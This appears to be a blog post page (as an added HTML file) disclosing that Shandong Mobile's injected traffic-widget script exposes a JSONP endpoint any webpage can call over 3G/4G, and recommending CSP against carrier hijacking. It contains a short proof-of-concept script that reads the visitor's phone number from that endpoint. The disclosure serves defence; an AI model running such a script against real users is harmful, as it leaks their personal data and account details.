@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>运营商劫持造成的风险案例 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="运营商劫持造成的风险案例 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/732/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            
+        </div>
+        <h1>运营商劫持造成的风险案例</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-04-14 16:36"><i class="iconfont icon-date"></i>2016-04-14 16:36</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>山东移动在使用3/4G的时候，会在网页中插入一段js，然后在网页右下角显示一个流量球，显示你当前剩余流量，点击流量球还可以办理业务。</p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/732/1.png" alt="请输入图片描述" /></p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/732/2.png" alt="请输入图片描述" /></p>
+
+<p>但是在使用jsonp查询的时候没有进行有效的安全校验，导致用户在使用3/4G的时候该接口可以被任意网页js调用，可以获取用户手机号码，当前已经办理的业务，当前的套餐情况，办理各种套餐等。当然这里除了对手机号打码之外也没有别的办法进行校验，毕竟是插入到别人的页面的，校验referer肯定不行。</p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/732/3.png" alt="请输入图片描述" /></p>
+
+<p>获取手机号的poc</p>
+
+<div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">angular</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"callbacks"</span><span class="p">:</span> <span class="p">{</span><span class="s2">"_y"</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span><span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">respparam</span><span class="p">.</span><span class="nx">phoneNumber</span><span class="p">);}}};</span>
+
+<span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+        <span class="na">url</span><span class="p">:</span> <span class="s2">"http://wap.toolbar.sd.chinamobile.com:8080/html/servicereq/queryMessageList?callback=angular.callbacks._y&amp;csession=-1648015146&amp;reqparam=%7B%22flag%22:%22-1%22,%22startNum%22:%221%22,%22number%22:%2210%22%7D&amp;templateId=fullscreenbar"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="s2">"get"</span><span class="p">,</span>
+        <span class="na">dataType</span><span class="p">:</span> <span class="s2">"jsonp"</span><span class="p">,</span>
+        <span class="na">jsonp</span><span class="p">:</span> <span class="s2">"angular.callbacks._y"</span><span class="p">,</span>
+<span class="p">})</span>
+</code></pre>
+</div>
+
+<p><img src="http://storage.virusdefender.net/blog/images/732/4.jpg" alt="请输入图片描述" /></p>
+
+<p>运营商劫持已经成为国内互联网安全隐患之一，越来越多的网站选择使用https来防范运营商劫持。使用CSP策略是暂时无法使用https的网站的临时解决方案。</p>
+
+<p>根据 http://www.cnblogs.com/Kevin-Zhao/articles/5216686.html qq音乐全站使用了下面的CSP策略</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>content-security-policy:script-src https: *.qq.com *.sinajs.cn *.gtimg.cn *.url.cn *.tenpay.com *.qpic.cn *.qpimg.cn *.idqqimg.com *.gtimg.com *.soso.com 'unsafe-inline' 'unsafe-eval'; report-uri http://qm.music.qq.com/report_csp
+</code></pre>
+</div>
+
+<p>2016年02月21日一天内就有2,322,499次占1.63%的PV被拦截上报，统计如下</p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/732/5.png" alt="请输入图片描述" /></p>
+
+<p>可见国内运营商劫持是多么的猖狂。</p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=运营商劫持造成的风险案例&article_id=/index.php/archives/732/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
